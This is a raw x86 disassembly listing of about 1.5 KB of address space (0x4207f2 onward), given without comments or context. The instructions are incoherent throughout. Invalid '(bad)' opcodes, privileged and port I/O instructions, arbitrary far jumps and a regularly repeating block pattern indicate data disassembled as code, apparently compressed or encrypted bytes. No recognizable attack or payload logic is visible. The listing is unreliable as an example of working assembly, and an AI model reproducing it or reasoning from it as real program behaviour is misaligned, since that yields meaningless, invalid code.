  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	or     bh,ah
  420802:	pop    ebx
  420803:	pop    ecx
  420804:	jp     0x420860
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x91000001
  42080d:	jg     0x4207db
  42080f:	in     al,dx
  420810:	push   0xffffffa0
  420812:	sbb    ah,BYTE PTR [eax+0x50]
  420815:	mov    DWORD PTR [esi+0x52a9117f],ebx
  42081b:	pop    edi
  42081c:	fimul  WORD PTR [esi-0x641bb5]
  420822:	sub    al,0x78
  420824:	(bad)  
  420825:	ins    DWORD PTR es:[edi],dx
  420826:	inc    ebx
  420827:	xchg   edx,eax
  420828:	repnz mov ebp,0x83897e7e
  42082e:	fsub   st(7),st
  420830:	int    0xc2
  420832:	jge    0x420854
  420834:	bound  edi,QWORD PTR [eax-0x798e3d0]
  42083a:	pop    ecx
  42083b:	ins    BYTE PTR es:[edi],dx
  42083c:	jne    0x4207f4
  42083e:	xor    esp,DWORD PTR [ebp+0x72c8316c]
  420844:	aas    
  420845:	ins    DWORD PTR es:[edi],dx
  420846:	mov    bl,0xed
  420848:	jmp    0x8aaa5ec3
  42084d:	and    al,BYTE PTR [esi]
  42084f:	(bad)  
  420850:	frstor [edx+0x51]
  420853:	mov    eax,0x9ff6dae9
  420858:	mov    edi,0x4f24c171
  42085d:	xor    edi,ebx
  42085f:	fsub   QWORD PTR [ebp-0x42ff75ed]
  420865:	mov    ebx,0xf43a363a
  42086a:	fsub   QWORD PTR [esi-0x52816106]
  420870:	add    cl,BYTE PTR [edx-0x19addd98]
  420876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420877:	fcom   QWORD PTR [edx-0x78740072]
  42087d:	shr    esp,1
  42087f:	inc    edx
  420880:	jle    0x4208f6
  420882:	cmp    bh,BYTE PTR [edx+0x28]
  420885:	inc    edi
  420886:	call   0xcb7b:0xf9fe5f32
  42088d:	in     al,0xb5
  42088f:	cmp    DWORD PTR [ecx],ebp
  420891:	fbld   TBYTE PTR [eax+ebx*1+0x5b05650d]
  420898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420899:	jnp    0x420898
  42089b:	shl    DWORD PTR [ebx-0x5bb7f5cf],cl
  4208a1:	ja     0x4208b3
  4208a3:	sbb    al,0xfc
  4208a5:	(bad)  [si]
  4208a8:	ins    DWORD PTR es:[edi],dx
  4208a9:	xchg   edx,eax
  4208aa:	cs ins DWORD PTR es:[edi],dx
  4208ac:	fild   WORD PTR [edi]
  4208ae:	sub    eax,0xf43ca5b4
  4208b3:	pop    ds
  4208b4:	call   0xf1bd:0x380bcd7c
  4208bb:	in     eax,dx
  4208bc:	fstp   QWORD PTR [edi+0x11]
  4208bf:	push   ebx
  4208c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208c1:	sbb    bh,BYTE PTR [esi]
  4208c3:	shr    DWORD PTR [ebx+edx*1],0x60
  4208c7:	sbb    ah,BYTE PTR [edi-0xe]
  4208ca:	pushf  
  4208cb:	or     al,0x29
  4208cd:	gs imul ecx,eax,0xf
  4208d1:	cs loope 0x420907
  4208d4:	retf   
  4208d5:	sbb    esp,DWORD PTR [ecx+0x188de0e0]
  4208db:	xchg   eax,esi
  4208dd:	pop    edx
  4208de:	je     0x4208e2
  4208e0:	lea    ebp,[ebp-0x76e0b282]
  4208e6:	scas   eax,DWORD PTR es:[edi]
  4208e7:	xchg   ebp,eax
  4208e8:	sub    eax,0x111a7bc5
  4208ed:	jno    0x4208ba
  4208ef:	js     0x420891
  4208f1:	jo     0x420888
  4208f3:	imul   esp,DWORD PTR [ebx+0x2b],0x5b
  4208f7:	(bad)  
  4208f8:	mov    edi,0x729d40f9
  4208fd:	(bad)  
  4208fe:	sahf   
  4208ff:	pop    esp
  420900:	mov    gs,WORD PTR [ebx+ecx*1]
  420903:	pop    esp
  420904:	mov    ds:0x6b81804b,al
  420909:	jge    0x420974
  42090b:	xor    DWORD PTR ds:[esi+0x3a],0x68c1
	...
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x1c
  420981:	mov    eax,0x5b7fd021
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xdc000001
  42098d:	push   ecx
  42098e:	pop    esp
  42098f:	xor    eax,eax
  420991:	mov    WORD PTR [esi-0x62],ss
  420994:	retf   0x5db6
  420997:	sbb    eax,0xe03dd20c
  42099c:	out    dx,eax
  42099d:	add    BYTE PTR [edx+0x7ce09abd],dh
  4209a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a4:	sub    edi,0xffffffec
  4209a7:	int3   
  4209a8:	push   esi
  4209a9:	cwde   
  4209aa:	or     BYTE PTR [edx+0x324e060],ah
  4209b0:	fst    QWORD PTR [esi-0x15b6f78e]
  4209b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b7:	jmp    0x3c39a65c
  4209bc:	mov    WORD PTR [esi+edx*2-0x39b27b7f],fs
  4209c3:	or     ebx,DWORD PTR [esi]
  4209c5:	popa   
  4209c6:	aaa    
  4209c7:	dec    ecx
  4209c8:	ds js  0x4209f8
  4209cb:	cwde   
  4209cc:	add    ecx,DWORD PTR [ecx]
  4209ce:	popf   
  4209cf:	outs   dx,DWORD PTR ds:[esi]
  4209d0:	mov    eax,ds:0xb2e72542
  4209d5:	and    edx,DWORD PTR [ecx]
  4209d7:	mov    bl,0x41
  4209d9:	xor    esi,DWORD PTR [edx]
  4209db:	aaa    
  4209dc:	popa   
  4209dd:	mov    ds:0xc1142483,al
  4209e2:	push   es
  4209e3:	mov    DWORD PTR [ebx-0x592793e5],0x34fde9b2
  4209ed:	or     edx,0x420e764
  4209f3:	stos   BYTE PTR es:[edi],al
  4209f4:	outs   dx,BYTE PTR ds:[esi]
  4209f5:	pop    ss
  4209f6:	mov    ?,esi
  4209f8:	mov    edi,0x1541428a
  4209fd:	ds lahf 
  4209ff:	test   DWORD PTR [ecx-0x21bca37],ecx
  420a05:	das    
  420a06:	fidiv  DWORD PTR [edi]
  420a08:	sbb    eax,0x1b8e9271
  420a0d:	inc    ebp
  420a0e:	dec    ecx
  420a0f:	cli    
  420a10:	arpl   WORD PTR [edi-0x42],ax
  420a13:	lods   eax,DWORD PTR ds:[esi]
  420a14:	push   cs
  420a15:	or     BYTE PTR [ebx-0x1a7df049],0x82
  420a1c:	mov    bl,BYTE PTR [eax+0x75]
  420a1f:	repz mov bl,0x3a
  420a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a23:	aam    0xb0
  420a25:	xor    dl,0x5d
  420a28:	inc    esi
  420a29:	fdivr  QWORD PTR [esi+ecx*1-0x9]
  420a2d:	aaa    
  420a2e:	leave  
  420a2f:	mov    ebp,DWORD PTR [ebp+0x55f57f03]
  420a35:	cmp    al,0x59
  420a37:	and    eax,0xbd54732c
  420a3c:	and    al,0x7c
  420a3e:	in     al,dx
  420a3f:	dec    eax
  420a40:	sbb    ebx,ebp
  420a42:	int3   
  420a43:	scas   eax,DWORD PTR es:[edi]
  420a44:	retf   0x5f42
  420a47:	sub    BYTE PTR [esi],ch
  420a49:	mov    al,ds:0x4e1c75af
  420a4e:	(bad)  [ebx]
  420a50:	sbb    bh,BYTE PTR ds:0x656d59d9
  420a56:	push   ss
  420a57:	mov    ah,0xaa
  420a59:	js     0x420a9f
  420a5b:	xchg   ebp,eax
  420a5c:	push   edx
  420a5d:	mov    eax,ds:0x9176a23e
  420a62:	mov    edx,0x8bc63f61
  420a67:	inc    ebx
  420a68:	loop   0x420a0c
  420a6a:	nop
  420a6b:	(bad)  
  420a6d:	sti    
  420a6e:	xor    BYTE PTR [edx-0x748a8688],ch
  420a74:	out    0xf2,eax
  420a76:	int    0xda
  420a78:	cdq    
  420a79:	inc    esp
  420a7a:	xchg   ecx,eax
  420a7b:	fcomp  DWORD PTR [edi-0x4e]
  420a7e:	scas   eax,DWORD PTR es:[edi]
  420a7f:	inc    eax
  420a80:	jns    0x420a34
  420a82:	inc    ebp
  420a83:	cmp    dh,BYTE PTR ds:0xbb2e3ad9
  420a89:	retf   0x2c1f
  420a8c:	fild   WORD PTR [edi]
  420a8e:	and    eax,0xfc0d
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	mov    dl,0x48
  420b02:	dec    ebp
  420b03:	test   BYTE PTR [esp+ebx*2+0x1050001],0x0
  420b0b:	add    dh,bh
  420b0d:	icebp  
  420b0e:	icebp  
  420b0f:	jnp    0x420aa7
  420b11:	adc    edi,DWORD PTR [edx-0x2c295904]
  420b17:	(bad)  
  420b19:	and    BYTE PTR [edx+edx*8-0x1770693d],dl
  420b20:	push   es
  420b21:	push   eax
  420b22:	push   ds
  420b23:	out    0xf0,al
  420b25:	xor    DWORD PTR ds:0x41ed20d5,esi
  420b2b:	xchg   ebx,eax
  420b2c:	cli    
  420b2d:	cmp    esi,DWORD PTR [eax]
  420b2f:	sahf   
  420b30:	stc    
  420b31:	mov    eax,ds:0xdbb848
  420b36:	inc    BYTE PTR [ebx-0x7cddf088]
  420b3c:	cmp    cl,BYTE PTR [edx+edi*8]
  420b3f:	(bad)  
  420b40:	xchg   edi,eax
  420b41:	repz in eax,0x98
  420b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b45:	in     al,0x38
  420b47:	sub    DWORD PTR [eax-0x68d0e954],edi
  420b4d:	enter  0x429d,0x2b
  420b51:	ficom  DWORD PTR [esi+eax*8]
  420b54:	in     eax,dx
  420b55:	pushf  
  420b56:	sbb    DWORD PTR [edx+0x6e3b81f],edi
  420b5c:	xchg   ebx,eax
  420b5d:	inc    esi
  420b5e:	pushf  
  420b5f:	xchg   edx,eax
  420b60:	cmp    al,BYTE PTR [ebp+0x32]
  420b63:	packssdw mm2,QWORD PTR [ecx+0x35]
  420b67:	sbb    edi,DWORD PTR [edi+esi*2]
  420b6a:	(bad)  
  420b6b:	lds    ecx,FWORD PTR ds:0x53acb446
  420b71:	popf   
  420b72:	pop    ecx
  420b73:	ja     0x420b78
  420b75:	repz inc ebx
  420b77:	in     eax,dx
  420b78:	hlt    
  420b79:	sbb    eax,0x768c0983
  420b7e:	and    edi,DWORD PTR [eax+0x544a77ec]
  420b84:	sub    dh,BYTE PTR [ecx+ebx*2+0x77]
  420b88:	(bad)  
  420b89:	pop    edx
  420b8a:	add    eax,0xc338faf3
  420b8f:	or     eax,ebx
  420b91:	pop    esp
  420b92:	add    esp,DWORD PTR [esi-0x54db6680]
  420b98:	or     eax,0x1e7560a5
  420b9d:	inc    edi
  420b9e:	jge    0x420b4b
  420ba0:	mov    DWORD PTR [eax+0x43],esp
  420ba3:	and    bh,BYTE PTR [ecx]
  420ba5:	imul   esp,DWORD PTR [esi],0x2e
  420ba8:	cmp    eax,0x3ead10f0
  420bad:	es sbb al,0xf0
  420bb0:	rol    DWORD PTR [edx],1
  420bb2:	sbb    al,0x6f
  420bb4:	fwait
  420bb5:	aam    0x94
  420bb7:	fs enter 0x70e5,0x1
  420bbc:	outs   dx,BYTE PTR ds:[esi]
  420bbd:	or     BYTE PTR [edx+0x50eaa701],bh
  420bc3:	cmp    ah,al
  420bc5:	fwait
  420bc6:	mov    ecx,ecx
  420bc8:	ror    cl,cl
  420bca:	fist   DWORD PTR [eax+0x76baafc6]
  420bd0:	or     DWORD PTR [eax-0x1f],ebp
  420bd3:	xor    eax,0x3376c922
  420bd8:	inc    edx
  420bd9:	inc    edx
  420bda:	repnz std 
  420bdc:	mov    ?,WORD PTR [edi]
  420bde:	mov    ecx,DWORD PTR gs:[edi+0x20]
  420be2:	mov    ebp,0x8c8ada63
  420be7:	xchg   esi,eax
  420be8:	xchg   ebp,eax
  420be9:	pop    eax
  420bea:	shl    BYTE PTR [esi+eiz*2-0x45989799],0x9b
  420bf2:	pusha  
  420bf3:	jg     0x420c4c
  420bf5:	popa   
  420bf6:	dec    edx
  420bf7:	scas   eax,DWORD PTR es:[edi]
  420bf8:	xchg   esi,eax
  420bf9:	ins    BYTE PTR es:[edi],dx
  420bfa:	mov    bl,0xa2
  420bfc:	add    al,0x49
  420bfe:	mov    ds:0x4440afce,al
  420c03:	push   esi
  420c04:	jno    0x420bf5
  420c06:	ja     0x420bbb
  420c08:	cli    
  420c09:	std    
  420c0a:	mov    bl,0x59
  420c0c:	push   cs
  420c0d:	clc    
  420c0e:	adc    esp,esi
  420c10:	xlat   BYTE PTR ds:[ebx]
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	(bad)  
  420c81:	push   0x5d899224
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x9a000001
  420c8d:	cmp    eax,0xfc638e5c
  420c92:	(bad)  
  420c93:	mov    ch,0x6e
  420c95:	push   esp
  420c96:	(bad)  
  420c97:	outs   dx,BYTE PTR ds:[esi]
  420c98:	xchg   ebp,eax
  420c99:	jne    0x420c6d
  420c9b:	int3   
  420c9c:	cmp    BYTE PTR [edi+ecx*1-0xf400645],cl
  420ca3:	jp     0x420d0e
  420ca5:	and    BYTE PTR [ebx],ah
  420ca7:	sti    
  420ca8:	dec    ebp
  420ca9:	fadd   QWORD PTR [ebp+0x1d]
  420cac:	into   
  420cad:	jmp    0x9ce3:0xa36e5e5a
  420cb4:	call   FWORD PTR [esi+0x17566ef9]
  420cba:	loop   0x420d36
  420cbc:	ret    0xe2b7
  420cbf:	in     al,0x59
  420cc1:	add    DWORD PTR [ecx-0x64],esi
  420cc4:	dec    edx
  420cc5:	pop    ecx
  420cc6:	aaa    
  420cc7:	dec    ebp
  420cc8:	pop    esp
  420cc9:	(bad)  
  420cca:	shl    BYTE PTR [ecx],1
  420ccc:	inc    esp
  420ccd:	outs   dx,DWORD PTR ds:[esi]
  420cce:	fwait
  420ccf:	mov    dl,0x66
  420cd1:	mov    ebx,0x71645827
  420cd6:	sub    al,0x4f
  420cd8:	neg    DWORD PTR [eax+0x1d76e4f8]
  420cde:	icebp  
  420cdf:	inc    esp
  420ce0:	imul   eax,ebx,0xffffffc8
  420ce3:	shl    BYTE PTR ds:0xebad04f4,1
  420ce9:	retf   
  420cea:	fsqrt  
  420cec:	xor    al,0x9f
  420cee:	icebp  
  420cef:	pop    eax
  420cf0:	scas   al,BYTE PTR es:[edi]
  420cf1:	ret    0x5a92
  420cf4:	js     0x420c91
  420cf6:	add    al,0xb9
  420cf8:	dec    ebp
  420cf9:	dec    edi
  420cfa:	mov    BYTE PTR [ecx-0x1f],cl
  420cfd:	pusha  
  420cfe:	dec    edx
  420cff:	push   esi
  420d00:	(bad)  
  420d01:	jno    0x420d58
  420d03:	leave  
  420d04:	mov    edx,0x9fe4ecab
  420d09:	fld    DWORD PTR [ebx-0x13]
  420d0c:	fwait
  420d0d:	pushf  
  420d0e:	test   eax,0x384ce019
  420d13:	(bad)  
  420d15:	pop    ss
  420d16:	cmp    esp,edi
  420d18:	xor    al,0xda
  420d1a:	in     al,0x35
  420d1c:	jge    0x420d71
  420d1e:	sbb    esp,DWORD PTR [edx]
  420d20:	or     esp,eax
  420d22:	xchg   DWORD PTR [ecx+0x418c4231],edx
  420d28:	add    BYTE PTR [edi+edx*8],cl
  420d2b:	call   0x3e0c992
  420d30:	adc    ebp,DWORD PTR [ecx-0x1c]
  420d33:	mov    ds:0x9abdd4d9,al
  420d38:	lea    ebx,[edx]
  420d3a:	sbb    eax,0x68cc1df9
  420d3f:	sahf   
  420d40:	cwde   
  420d41:	arpl   cx,di
  420d43:	xor    BYTE PTR [eax+ebp*8+0x294ffa9c],dh
  420d4a:	cwd    
  420d4c:	gs or  bl,dl
  420d4f:	into   
  420d50:	adc    al,0x55
  420d52:	add    dl,BYTE PTR [ecx+0x76]
  420d55:	(bad)  
  420d56:	and    ah,BYTE PTR [edi]
  420d58:	xor    dh,BYTE PTR [edi]
  420d5a:	out    0xc7,al
  420d5c:	fmul   DWORD PTR [esi+0x16]
  420d5f:	cdq    
  420d60:	or     eax,0xf13b2cf3
  420d65:	add    al,0xca
  420d67:	loope  0x420da5
  420d69:	xchg   esp,eax
  420d6a:	sub    eax,0xb541f443
  420d6f:	ror    BYTE PTR [esi*1-0x1b2fa41c],0xb9
  420d77:	push   esp
  420d78:	cmp    ecx,DWORD PTR [edi]
  420d7a:	sbb    ebx,DWORD PTR [edx+esi*8+0x25]
  420d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d7f:	in     eax,dx
  420d80:	retf   
  420d81:	jmp    0x672851b8
  420d86:	mov    eax,ds:0xa2f9272a
  420d8b:	aad    0x7e
  420d8d:	jge    0x420dd6
  420d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d90:	cmp    al,0x0
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x9972d355
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xdf000001,al
  420e0d:	mov    bl,BYTE PTR [edi+0x2]
  420e10:	ins    BYTE PTR es:[edi],dx
  420e11:	add    esi,DWORD PTR [eax+0x42]
  420e14:	xchg   ebp,eax
  420e15:	fdiv   QWORD PTR [ecx-0x147fd626]
  420e1b:	jge    0x420e95
  420e1d:	aam    0x25
  420e1f:	dec    ebp
  420e20:	inc    edx
  420e21:	and    bl,BYTE PTR [ecx+0x26]
  420e24:	inc    edi
  420e25:	fwait
  420e26:	shl    DWORD PTR [esi+0xd470c51],0xae
  420e2d:	xchg   esi,eax
  420e2e:	jge    0x420ea0
  420e30:	xor    esi,DWORD PTR [ecx-0x6177a39e]
  420e36:	(bad)  
  420e37:	xchg   edi,eax
  420e38:	fisubr WORD PTR [ecx+0x9352812]
  420e3e:	mov    ebp,0x713026f1
  420e43:	jno    0x420de9
  420e45:	inc    ebx
  420e46:	jne    0x420e7a
  420e48:	stc    
  420e49:	pop    ecx
  420e4a:	push   esp
  420e4b:	adc    DWORD PTR [esi],0x1d823d72
  420e51:	lods   eax,DWORD PTR ds:[esi]
  420e52:	(bad)  
  420e53:	pop    DWORD PTR [ebp-0x6203e430]
  420e59:	fistp  DWORD PTR [edx-0x75]
  420e5c:	xchg   esi,eax
  420e5d:	shr    DWORD PTR [ebx],1
  420e5f:	vmread DWORD PTR [esi+0x6abc5ec5],ebp
  420e66:	retf   0x7135
  420e69:	repz fsub st,st(0)
  420e6c:	dec    esp
  420e6d:	and    dl,BYTE PTR [edx]
  420e6f:	gs pop esi
  420e71:	jecxz  0x420e41
  420e73:	mov    eax,ds:0x28268a0e
  420e78:	adc    al,0x61
  420e7a:	mov    ebx,0x9b0ccb2a
  420e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e80:	loopne 0x420ec4
  420e82:	jno    0x420e6e
  420e84:	push   edx
  420e85:	xor    eax,0x819808f4
  420e8a:	out    dx,al
  420e8b:	pop    edi
  420e8c:	dec    DWORD PTR [ebx+0x4f]
  420e8f:	hlt    
  420e90:	loope  0x420efc
  420e92:	dec    edx
  420e93:	inc    ebx
  420e94:	loope  0x420ebd
  420e96:	pop    eax
  420e97:	ins    DWORD PTR es:[edi],dx
  420e98:	mov    WORD PTR [edx-0xc],ss
  420e9b:	jnp    0x420ef4
  420e9d:	stos   DWORD PTR es:[edi],eax
  420e9e:	push   0xffffffb4
  420ea0:	sbb    ebp,DWORD PTR [eax-0x7bd4f903]
  420ea6:	jbe    0x420e74
  420ea8:	jmp    0x4283:0x93eb0d41
  420eaf:	dec    ecx
  420eb0:	es cs addr16 addr16 or al,0x15
  420eb6:	push   cs
  420eb7:	dec    ebp
  420eb8:	cmp    edx,ebp
  420eba:	sahf   
  420ebb:	pop    ebp
  420ebc:	sub    DWORD PTR [esi+0x7d],esp
  420ebf:	mov    esi,0xaa875b79
  420ec4:	aas    
  420ec5:	lock mov ds:0xa1d9d335,al
  420ecb:	and    cl,cl
  420ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ece:	(bad)  
  420ed0:	sahf   
  420ed1:	into   
  420ed2:	data16 xor BYTE PTR [edi+0x35],ah
  420ed6:	jg     0x420e86
  420ed8:	inc    ebx
  420ed9:	push   ebx
  420eda:	cli    
  420edb:	lods   al,BYTE PTR ds:[esi]
  420edc:	sbb    ecx,eax
  420ede:	lds    ecx,FWORD PTR [ebp+0x4d]
  420ee1:	or     BYTE PTR [ebx+ecx*4+0x54466246],dl
  420ee8:	dec    ecx
  420ee9:	jnp    0x420f69
  420eeb:	in     al,dx
  420eec:	mov    DWORD PTR [ecx+0x6deaa129],0xe4ddbbe
  420ef6:	mov    edi,0x5d828067
  420efb:	jecxz  0x420f75
  420efd:	(bad)  [esi+0x34]
  420f00:	pop    eax
  420f01:	sub    al,BYTE PTR [ebx+ebp*2+0x307c8fa5]
  420f08:	pushf  
  420f09:	xor    DWORD PTR [esi-0x66],0x5f
  420f0d:	jp     0x420f56
  420f0f:	jmp    0x420f01
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x3dc811ac]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x31000001
  420f8d:	adc    eax,0x3086d9b4
  420f92:	adc    al,0x3
  420f94:	out    dx,eax
  420f95:	jnp    0x420fab
  420f97:	lods   eax,DWORD PTR ds:[esi]
  420f98:	mov    al,0xdc
  420f9a:	(bad)  
  420f9b:	and    eax,0xfcdd8b84
  420fa0:	ss inc ebp
  420fa2:	add    eax,0xd0272893
  420fa7:	sahf   
  420fa8:	lds    eax,FWORD PTR [esi+eiz*2-0x21a8a82f]
  420faf:	or     DWORD PTR [edi+ebx*8-0xd0bbc37],0xa7df7ca8
  420fba:	sar    eax,0x8c
  420fbd:	cmp    eax,0x4a6311f1
  420fc2:	sub    DWORD PTR [edx],edx
  420fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fc5:	sbb    DWORD PTR [eax-0x10],0x4
  420fc9:	sub    esp,DWORD PTR [ebx]
  420fcb:	sbb    bl,dl
  420fcd:	std    
  420fce:	jnp    0x42100d
  420fd0:	pushf  
  420fd1:	fdiv   DWORD PTR [ebx]
  420fd3:	cmp    ebx,DWORD PTR [eax-0x1593f334]
  420fd9:	call   0x4d2b:0x36f4b706
  420fe0:	fcmovu st,st(3)
  420fe2:	fdivr  DWORD PTR [ebx]
  420fe4:	imul   ecx,edi,0x829d901b
  420fea:	idiv   DWORD PTR [ebp-0x681db453]
  420ff0:	mov    esi,0xc59f294f
  420ff5:	repnz sbb ebx,DWORD PTR [esi+0x22b145dc]
  420ffc:	or     ch,BYTE PTR [edx-0x4c]
  420fff:	fild   WORD PTR ds:0x251c51ee
  421005:	mov    WORD PTR [ebp+0x15475bc8],?
  42100b:	jbe    0x42104e
  42100d:	frstor [ebp+0x51d6f09f]
  421013:	shl    BYTE PTR ds:0x28d32669,1
  421019:	add    al,0xc0
  42101b:	xchg   esi,eax
  42101c:	cwde   
  42101d:	iret   
  42101e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42101f:	cwde   
  421020:	xchg   edi,eax
  421021:	popf   
  421022:	xor    eax,0x6be9094a
  421027:	push   es
  421028:	pop    es
  421029:	and    al,0xd3
  42102b:	dec    edi
  42102c:	adc    bl,BYTE PTR [esi+0x65e61fd0]
  421032:	sbb    ch,bh
  421034:	(bad)  
  421035:	xchg   ebx,eax
  421036:	retf   
  421037:	stos   DWORD PTR es:[edi],eax
  421038:	lods   al,BYTE PTR ds:[esi]
  421039:	jl     0x421007
  42103b:	ins    DWORD PTR es:[edi],dx
  42103c:	jle    0x42102d
  42103e:	and    al,0xab
  421040:	mov    cl,0x1a
  421042:	and    edi,ebx
  421044:	pop    eax
  421045:	aad    0x43
  421047:	xor    DWORD PTR [ebp-0x4ba7fcf6],0xc288fe3d
  421051:	fmul   st(5),st
  421053:	call   0xfa8ce7f7
  421058:	push   ss
  421059:	test   DWORD PTR [edx],edi
  42105b:	out    0xc8,al
  42105d:	(bad)  
  42105e:	push   es
  42105f:	xchg   edx,eax
  421060:	sub    BYTE PTR [esi],bl
  421062:	xor    eax,0xdad2f81f
  421067:	xor    al,BYTE PTR [edx-0x4f]
  42106a:	inc    esp
  42106b:	fsubr  QWORD PTR [edi+0x4c]
  42106e:	push   esi
  42106f:	jb     0x421092
  421071:	jns    0x421037
  421073:	push   ss
  421074:	in     al,0x8
  421076:	aaa    
  421077:	pop    edx
  421078:	mov    edi,0xdce49486
  42107d:	or     BYTE PTR [ecx-0x7],bl
  421080:	pop    edx
  421081:	and    eax,0x7d57cf67
  421086:	sub    bh,bh
  421088:	retf   0xf175
  42108b:	xchg   edx,eax
  42108c:	or     al,BYTE PTR [esi+edi*8]
  42108f:	pop    edx
  421090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [ebx+edx*1]
  421102:	xor    ecx,0xffffff98
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0xad000001
  42110d:	inc    eax
  42110e:	xchg   edi,eax
  42110f:	sub    ecx,DWORD PTR [esi]
  421111:	fdiv   QWORD PTR [esi-0x3cec000f]
  421117:	ins    DWORD PTR es:[edi],dx
  421118:	loop   0x421157
  42111a:	and    BYTE PTR [edi+ebx*1],0xeb
  42111e:	(bad)  
  42111f:	imul   edx,DWORD PTR [ebx+0x31d83523],0x53
  421126:	rcr    BYTE PTR [edi+esi*1-0x7c],1
  42112a:	jno    0x421142
  42112c:	push   ecx
  42112d:	push   esi
  42112e:	sub    edi,ebp
  421130:	add    BYTE PTR [edi],bh
  421132:	xlat   BYTE PTR ds:[ebx]
  421133:	lahf   
  421134:	mov    bh,BYTE PTR [ebp+0x57b8b321]
  42113a:	xor    al,0xf8
  42113c:	fisub  WORD PTR [ebp+0x61]
  42113f:	xchg   esi,eax
  421140:	mov    edi,0x9c2977c6
  421145:	inc    esp
  421146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421147:	xchg   esp,eax
  421148:	pop    esp
  421149:	lock jmp 0xe9a9:0x9e4684ba
  421151:	fwait
  421152:	call   DWORD PTR [ecx]
  421154:	shl    DWORD PTR [edi-0x1a762f32],cl
  42115a:	pop    esi
  42115b:	jbe    0x4211b8
  42115d:	inc    edx
  42115e:	scas   eax,DWORD PTR es:[edi]
  42115f:	adc    esi,DWORD PTR [eax+0x190a89d6]
  421165:	ins    DWORD PTR es:[edi],dx
  421166:	les    ebp,FWORD PTR [eax-0x32]
  421169:	fwait
  42116a:	loopne 0x4211d2
  42116c:	in     eax,dx
  42116d:	aad    0xac
  42116f:	fwait
  421170:	xrelease mov BYTE PTR [ebp-0x580075ba],bl
  421177:	fld    QWORD PTR [ebx+0x2de336c]
  42117d:	scas   eax,DWORD PTR es:[edi]
  42117e:	ret    
  42117f:	pop    ecx
  421180:	imul   eax,DWORD PTR [ecx+0x454343ac],0xe193c13a
  42118a:	fcmove st,st(4)
  42118c:	imul   DWORD PTR [edx+0x37]
  42118f:	cmp    DWORD PTR [edx+0x51],ebp
  421192:	stc    
  421193:	xor    al,0xea
  421195:	cmp    BYTE PTR [edx+0x49],bl
  421198:	rcr    BYTE PTR [ecx],1
  42119a:	xchg   ebx,eax
  42119b:	shl    esp,cl
  42119d:	fisttp WORD PTR [ebx]
  42119f:	mov    eax,0x49654fda
  4211a4:	and    BYTE PTR [eax+0x3ad19a61],cl
  4211aa:	out    dx,al
  4211ab:	xchg   edx,eax
  4211ac:	dec    esp
  4211ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ae:	dec    ebp
  4211af:	call   0xe454:0xe5e1da78
  4211b6:	or     ebx,DWORD PTR [edi-0x3e]
  4211b9:	pop    ecx
  4211ba:	fiadd  WORD PTR [eax+0x17]
  4211bd:	jle    0x42116a
  4211bf:	pop    ecx
  4211c0:	mov    ds:0xecd12f0f,eax
  4211c5:	call   0xd4d34d7d
  4211ca:	jp     0x42115e
  4211cc:	mov    WORD PTR [ebx+eiz*8+0x12],gs
  4211d0:	pop    ebx
  4211d1:	and    al,0x30
  4211d3:	jno    0x421159
  4211d5:	outs   dx,DWORD PTR ds:[esi]
  4211d6:	mov    edx,DWORD PTR [ebx-0x6bfd72f5]
